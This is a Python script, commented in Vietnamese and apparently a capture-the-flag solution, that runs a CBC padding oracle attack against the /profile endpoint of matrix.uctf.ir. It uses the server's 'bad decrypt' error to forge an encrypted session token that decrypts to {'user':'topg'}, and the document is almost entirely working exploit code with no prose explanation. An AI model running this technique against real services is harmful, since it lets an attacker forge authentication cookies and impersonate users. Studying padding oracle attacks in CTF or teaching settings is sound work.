from tqdm import tqdm  # Thư viện để hiển thị thanh tiến trình
import struct  # Thư viện để thao tác với binary data
from Crypto.Util.strxor import *  # Thư viện để thực hiện phép XOR giữa chuỗi bytes
import binascii  # Thư viện để thao tác với dữ liệu binary
import base64  # Thư viện để mã hóa và giải mã Base64
import requests  # Thư viện để gửi yêu cầu HTTP đến máy chủ
import urllib.parse  # Thư viện để mã hóa các ký tự đặc biệt trong URL

BASE_URL = 'https://matrix.uctf.ir'  # URL của ứng dụng web mục tiêu

# Hàm kiểm tra xem một chuỗi bytes c có hợp lệ hay không
def check(c):
    c = base64.b64encode(c)  # Mã hóa chuỗi c thành Base64
    c = urllib.parse.quote(c)  # Mã hóa URL

    # Gửi yêu cầu GET đến BASE_URL và kiểm tra phản hồi
    t = requests.get(BASE_URL + '/profile', cookies={
        'a07680ed6e93df92c495eaba7ddfe23b': 'eb81b14c5e5d7d24307dfde6d29f57d1',
        'token': c}).text
    
    # Kiểm tra xem phản hồi có chứa thông báo lỗi không
    ret = 'error:1C800064:Provider routines::bad decrypt' not in t
    return ret

# Hàm thực hiện tấn công Padding Oracle
def rewrite(enc, aim, bsize):
    assert len(enc) % bsize == 0  # Đảm bảo độ dài của enc là bội số của bsize
    
    num_block = len(enc) // bsize  # Số lượng block trong chuỗi mã hóa
    for i in range(num_block):
        print(b'[block ' + str(i + 1).encode() + b'] ' + enc[i*bsize:(i+1)*bsize])

    num_aim_block = len(aim) // bsize  # Số lượng block trong chuỗi aim

    res = enc[(num_block - 1)*bsize:num_block*bsize]  # Kết quả cuối cùng
    curr_block = enc[(num_block - 1)*bsize:num_block*bsize]

    # Lặp qua từng block của chuỗi aim
    for idx_block in range(num_aim_block):
        dec = b''  # Kết quả giải mã
        for i in tqdm(range(bsize)):  # Lặp qua từng byte trong block
            for j in tqdm(range(256)):  # Lặp qua từng giá trị byte có thể có (0-255)
                # Tạo payload để kiểm tra sự hợp lệ
                payload = b'\x00' * (bsize - i - 1 + (num_block - 2 - idx_block)*bsize) + struct.pack("B", j) + strxor(struct.pack("B", i + 1) * i, dec) + curr_block
                if check(payload):  # Kiểm tra payload
                    dec = strxor(struct.pack("B", i + 1), struct.pack("B", j)) + dec
                    break
            assert len(dec) == i + 1
        curr_block = strxor(aim[(num_aim_block - 1 - idx_block)*bsize:(num_aim_block - idx_block)*bsize], dec)
        res = curr_block + res
    res = enc[0:(num_block - (num_aim_block + 1))*bsize] + res
    return res

enc = 'fo39v/beY1IAAZZpwmHSIpJmRYL0z+jmRL8P6g7pWgI='  # Chuỗi mã hóa Base64
enc = base64.b64decode(enc)  # Giải mã chuỗi enc thành bytes thô
res = rewrite(enc, b'{"user":"topg"}\x01', 16)  # Thực hiện tấn công Padding Oracle
res = base64.b64encode(res)  # Mã hóa kết quả thành Base64
print(res)  # In kết quả
